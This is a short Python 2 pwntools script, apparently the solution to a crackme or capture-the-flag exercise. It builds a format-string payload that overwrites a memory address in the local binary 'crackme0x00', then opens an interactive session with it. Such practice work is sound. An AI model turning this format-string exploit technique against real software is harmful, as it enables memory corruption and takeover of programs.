#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32

payload = fmtstr_payload(4, {0xaaaaaaaa: 0xc0ffee}, 10)

p = process("./crackme0x00")

p.sendline(payload)
p.interactive()
